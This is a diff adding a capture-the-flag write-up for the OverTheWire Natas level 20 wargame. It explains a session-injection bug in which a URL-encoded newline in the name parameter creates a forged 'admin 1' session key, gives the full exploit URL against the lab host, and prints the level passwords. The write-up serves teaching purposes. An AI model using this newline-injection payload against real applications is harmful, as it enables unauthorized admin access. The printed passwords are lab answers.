@@ -397,3 +397,60 @@ else:
 When we run it, we find the password for the next level.
 
 Password: `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`
+
+# Level 20 — writeup (your style)
+
+**What the level asks:** make the session contain `admin = 1` so the page treats you as an admin and prints the next-level password.
+
+**Short story:** the site uses a custom session format. When it writes the session it just does:
+
+```
+key value\n
+key value\n
+```
+
+and when it reads it splits on newlines and then on the first space to recover `key` and `value`.  
+There is **no escaping**, so if you can put a newline into a value you can create an extra key/value pair.
+## The idea (one line)
+
+Send a `name` that contains a newline followed by `admin 1`.  
+When the server writes the session file you end up with two lines, and when it reads them you get `$_SESSION["admin"] = "1"`.
+
+URL-encoded newline + space:
+
+```
+admin%0Aadmin%201
+```
+
+So the full URL that does it:
+
+```
+http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin%0Aadmin%201
+```
+
+What this writes to the session file:
+
+```
+name admin
+admin 1
+```
+
+And on read:
+
+```php
+$_SESSION['name']  = 'admin';
+$_SESSION['admin'] = '1';
+```
+
+Because the page checks:
+
+```php
+if ($_SESSION && array_key_exists("admin", $_SESSION) && $_SESSION["admin"] == 1)
+```
+
+the loose comparison `"1" == 1` passes and you are treated as admin.
+
+The app **trusts user input** and stores it in a parseable format **without escaping**. That lets attackers inject structure (newlines → new keys) into persistent state. It’s a classic **session injection / improper serialization** bug.
+Visiting the payload URL gives the next level credentials:
+**Password for natas21:** `BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`
+
